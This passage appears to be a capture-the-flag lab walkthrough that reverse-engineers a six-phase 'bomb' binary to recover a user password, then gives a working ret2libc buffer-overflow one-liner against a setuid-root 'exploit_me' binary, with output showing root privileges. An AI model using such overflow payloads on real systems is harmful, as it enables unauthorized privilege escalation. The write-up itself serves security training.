when logged as laurie. A readme tells us to defuse the bomb (binary file).

using hopper:

phase1:
checks that our input is 'Public speaking is very easy.'

phase2:
calculates the factorials until 6! '1 2 6 24 120 720'

phase3:
simple switch cases, there are multiple answers. we take the first one with the hint '1 b 214'

phase4:
asks for the index of the 10th element of the fibonacci sequence but theirs start with [1, 1] so answer is '9'

phase5:
takes a string of len 6, for each char does c & 0xf with returns an int < 16
those 6 integers are used as indexes for a new string of length 6
the string that takes those integers as indexes is "isrveawhobpnutfg"
the newly constructed string is then compared to "giants" and if they are equal we get to the next phase
we did a quick script to see which letters could be used (phase5.py)
here are the results:
g: [o]
i: [p]
a: [e, u]
n: [k]
t: [m]
s: [a, q]
so the possibilites are:
opekma opekmq opukma opukmq
all work

phase6:
0x804b26c address is called
using gdb it tells us that it is 'node1', we can find the nodes up to node6 with nodeX_address = nodeX-1 - 0xC (12 in dec)
node1 = 253
node2 = 725
node3 = 301
node4 = 997
node5 = 212
node6 = 432
function verifies that our 6 inputs are below 6, so it checks for node index
at the end cheks that the order is decreasing -> '4 2 6 3 1 5'

after testing a few possibilites password for thor is Publicspeakingisveryeasy.126241207201b2149opekmq426135
3 and 1 are switched because subject is shit https://stackoverflow.com/c/42network/questions/664

https://www.calormen.com/jslogo/ for turtle
-> 'SLASH' that we must digest
-> md5 'slash : 646da671ca01bb5d84dbb5fb2238dc8e

in zaz, binary named exploit_me with 'root' as its owner
there's an strcpy call, let's try to overflow
we overflow with an offset of 140 to the saved eip

we can get system, exit and "/bin/sh" addresses to do a ret2libc attack
./exploit_me `python -c 'print("a"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
